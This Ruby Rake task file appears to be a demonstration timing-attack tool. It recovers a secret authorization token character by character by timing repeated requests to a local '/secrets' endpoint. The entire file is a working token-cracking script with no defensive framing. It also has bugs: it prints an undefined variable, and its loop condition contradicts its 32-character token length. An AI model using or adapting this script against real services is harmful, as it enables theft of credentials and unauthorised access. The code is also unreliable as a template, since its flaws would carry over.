# frozen_string_literal: true

require "benchmark"
require "net/http"
require "pry-byebug"

HEX_CHARS = (0..9).map(&:to_s) + ["a", "b", "c", "d", "e", "f"]
BASE_TOKEN = "................................"

namespace :timing_attack do
  desc "execute a timing attack against the secret endpoint"
  task :execute do
    trap("SIGINT") do
      puts "aborted"
      exit 1
    end

    token = crack_token
    puts "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    puts "!! token cracked: #{cracked_token} !!"
    puts "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  end

  def crack_token
    current_token_progress = ""
    while make_request(current_token_progress).code != "200" || current_token_progress.length <= 100 do
      cracked_character = find_character(current_token_progress)
      current_token_progress += cracked_character
      puts "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
      puts "Guessing character: '#{cracked_character}'"
      puts "Current token progress: '#{current_token_progress}'"
      puts "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    end
    current_token_progress
  end

  def find_character(current_token_progress)
    slowest_char = { timing_stat: 0 }
    HEX_CHARS.each do |character|
      token = (current_token_progress + character + BASE_TOKEN)[0..31]
      timing_stat = test_token(token)
      if timing_stat > slowest_char[:timing_stat]
        slowest_char[:timing_stat] = timing_stat
        slowest_char[:character] = character
      end
    end
    slowest_char[:character]
  end

  def test_token(token)
    times = []
    50.times do
      times << Benchmark.realtime do
        make_request(token)
      end
    end
    mean(times)
  end

  def make_request(token)
    uri = URI.parse("http://localhost:3001/secrets")
    req = Net::HTTP::Get.new(uri)
    req["Authorization"] = "Token #{token}"
    Net::HTTP.start(uri.hostname, uri.port) do |http|
      http.request(req)
    end
  end

  def mean(times)
    times.reduce(:+) / times.length.to_f
  end

  def median(times)
    times.sort[times.length.to_f / 2]
  end
end
